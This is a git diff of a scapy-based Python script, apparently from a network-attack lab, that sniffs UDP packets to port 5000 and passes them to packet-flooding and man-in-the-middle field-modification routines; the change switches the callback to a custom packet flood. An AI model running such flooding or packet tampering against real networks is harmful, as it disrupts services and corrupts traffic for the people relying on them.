@@ -3,8 +3,9 @@ import subprocess
 from TheManInTheMiddle.ApplyAndSend import apply_and_send
 from Attacks.RawOverwrite import overwrite_raw_contents
 from Attacks.FloodingDisruption import flood_destination
-from Attacks.DeathByPacketFlood import deathByPacket
+from Attacks.MultiPortPacketFlood import deathByPacket
 from Attacks.FieldModification import modify_field
+from Attacks.CustomLayerDisruptionFlood import CustomPacketFlood
 import time
 from scapy.config import conf
 conf.debug_dissector = 2 #<- apperantly, this is used for longer debug msgs
@@ -18,7 +19,8 @@ def listen_to_packets(packet):
 
 sniff(
     iface="eth0",
-    prn=lambda x: apply_and_send(x, lambda y: modify_field(y, "Raw", "load", b"Modified Content")),
+    # prn=lambda x: apply_and_send(x, lambda y: modify_field(y, "Raw", "load", b"Modified Content")),
+    prn=CustomPacketFlood,
     store=False,
     filter="udp and dst port 5000", #this if we only want to attack the receiver,
                                     #  filter="udp and (port 5000 or port 4000)",
